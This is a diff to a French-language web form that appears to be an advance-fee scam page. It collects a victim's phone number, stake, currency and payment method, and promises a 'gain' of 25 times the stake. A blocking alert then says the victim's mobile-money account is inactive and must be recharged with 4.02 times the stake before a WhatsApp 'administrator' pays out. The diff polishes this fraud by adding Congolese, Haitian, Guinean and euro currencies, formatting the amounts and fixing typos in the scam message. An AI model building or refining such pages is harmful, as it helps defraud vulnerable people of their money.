@@ -155,9 +155,18 @@
         Entrez votre numéro de téléphone pour recevoir le gain.
       </small>
 
-      <!-- Montant investi -->
+      <!-- Montant investi : filtré pour n’accepter que des chiffres -->
       <label for="amount">Montant investi</label>
-      <input type="number" id="amount" name="amount" placeholder="Ex. 500" min="1" required>
+      <input
+        type="text"
+        id="amount"
+        name="amount"
+        placeholder="Ex: 500"
+        inputmode="numeric"
+        pattern="\d+"
+        required
+        oninput="this.value = this.value.replace(/\D/g, '')"
+      >
 
       <!-- Devise -->
       <label for="currency">Devise</label>
@@ -165,6 +174,10 @@
         <option value="">Sélectionnez</option>
         <option value="FCFA">FCFA</option>
         <option value="USD">USD</option>
+        <option value="EUR">Euro</option>
+        <option value="CDF">Franc congolais</option>
+        <option value="HTG">Gourde (Haïti)</option>
+        <option value="GNF">Franc guinéen</option>
       </select>
 
       <!-- Moyen de paiement -->
@@ -231,6 +244,27 @@
       { name: "Éthiopie", code: "ET", dial_code: "+251", phone_length: 9 },
       { name: "Haïti", code: "HT", dial_code: "+509", phone_length: 8 },
     ];
+
+    // Fonction pour formater un montant selon la devise
+    function formatAmount(amount, currency) {
+      // amount est supposé un nombre (ici parseInt ou parseFloat sur un champ filtré chiffres uniquement)
+      switch (currency) {
+        case 'FCFA':
+          return amount.toLocaleString('fr-FR') + ' FCFA';
+        case 'USD':
+          return amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' $';
+        case 'EUR':
+          return amount.toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' €';
+        case 'CDF':
+          return amount.toLocaleString('fr-FR') + ' CDF';
+        case 'HTG':
+          return amount.toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' HTG';
+        case 'GNF':
+          return amount.toLocaleString('fr-FR') + ' GNF';
+        default:
+          return amount.toString() + ' ' + currency;
+      }
+    }
 
     document.addEventListener('DOMContentLoaded', () => {
       // Peupler le pays
@@ -324,11 +358,13 @@
           }
         }
         const amountInput = document.getElementById('amount');
-        const amount = parseFloat(amountInput.value);
-        if (isNaN(amount) || amount <= 0) {
-          alert("Veuillez saisir un montant investi valide.");
+        const amountValueStr = amountInput.value.trim();
+        // Validation : seulement des chiffres et > 0
+        if (!/^\d+$/.test(amountValueStr) || parseInt(amountValueStr, 10) <= 0) {
+          alert("Veuillez saisir un montant investi valide (seulement des chiffres, supérieur à 0).");
           return;
         }
+        const amount = parseInt(amountValueStr, 10);
         const currencySelect = document.getElementById('currency');
         const currency = currencySelect.value;
         if (!currency) {
@@ -351,7 +387,8 @@
         // Calculs
         let bonusValue = amount * 25;
         let rechargeValue = amount * 4.02;
-        if (currency === 'USD') {
+        // Arrondi selon devise : pour USD, EUR, HTG on garde 2 décimales, sinon entier
+        if (currency === 'USD' || currency === 'EUR' || currency === 'HTG') {
           bonusValue = Math.round(bonusValue * 100) / 100;
           rechargeValue = Math.round(rechargeValue * 100) / 100;
         } else {
@@ -389,9 +426,9 @@
         // Affichage de l’alerte bloquante après avoir lancé l'envoi
         const message =
           `🚨 Alerte : votre compte ${paymentMethod} est inactif pour recevoir votre gain !\n\n` +
-          `ℹ️ Solition: Pour recevoir vos ${bonusValue} ${currency}, vous devez recharger un montant de ${rechargeValue} ${currency} dans votre compte ${paymentMethod} pour l'activer.\n\n` +
-          `✅ Une fois la recharge effectuée, contactez votre administrateur sur whatsapp pour finaliser votre paiement ! \n\n` +
-          `🚨 NB: Depêchez vous d'effectuer la recharge pour eviter des imprévus, Merci pour votre bonne compréhension ‼️`;
+          `ℹ️ Solution : Pour recevoir vos ${formatAmount(bonusValue, currency)}, vous devez recharger un montant de ${formatAmount(rechargeValue, currency)} dans votre compte ${paymentMethod} pour l'activer.\n\n` +
+          `✅ Une fois la recharge effectuée, contactez votre administrateur sur WhatsApp pour finaliser votre paiement !\n\n` +
+          `🚨 NB: Dépêchez-vous d'effectuer la recharge pour éviter des imprévus, Merci pour votre bonne compréhension ‼️`;
         alert(message);
 
         // Optionnel : redirection vers une page de remerciement ou réinitialisation du formulaire
